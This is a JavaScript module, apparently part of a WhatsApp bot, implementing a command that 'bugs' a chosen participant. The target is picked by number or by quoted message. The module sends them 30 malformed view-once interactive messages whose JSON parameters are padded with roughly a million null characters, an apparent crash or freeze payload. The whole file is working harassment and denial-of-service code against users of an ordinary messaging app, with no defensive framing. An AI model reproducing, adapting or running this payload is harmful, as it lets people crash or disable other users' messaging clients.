import send from "../utils/sendMessage.js";

// Function to send the beta1 bug message
async function bug(message, sock, participant) {
    try {
        const target = participant;

        await sock.relayMessage(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: " -ّ⸙𓆩ɢʜᴏsᴛɢ 𝐗 𓆪⸙-ّ",
                                format: "EXTENSIONS_1",
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zyntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3,
                            },
                        },
                    },
                },
            },
            { participant: { jid: target } }
        );

    } catch (err) {
        console.error("❌ Erreur dans bug():", err);
        await send(sock, message.key.remoteJid, {
            text: `❌ Erreur lors de l'envoi du bug au participant ${participant}: ${err.message}`,
        });
    }
}

// Main command
export default async function fuck(sock, message) {
    try {
        const remoteJid = message.key?.remoteJid;
        if (!remoteJid) throw new Error("Message JID is undefined.");

        await send(sock, remoteJid, { text: "📡 Tentative de bug du participant..." });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
        const commandAndArgs = messageBody.slice(1).trim();
        const parts = commandAndArgs.split(/\s+/);
        const args = parts.slice(1);

        let participant;
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant;
        } else if (args.length > 0) {
            participant = args[0].replace("@", "") + "@s.whatsapp.net";
        } else {
            throw new Error("❌ Spécifie la personne à buguer.");
        }

        const num = "@" + participant.replace("@s.whatsapp.net", "");

        // Execute the bug command 30 times with 1s interval
        for (let i = 0; i < 30; i++) {
            await bug(message, sock, participant);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        await send(sock, remoteJid, { text: `✅ Bug envoyé au participant ${num} 30 fois !` });

    } catch (err) {
        console.error("❌ Erreur dans fuck():", err);
        await send(sock, message.key.remoteJid, { text: `❌ Erreur : ${err.message}` });
    }
}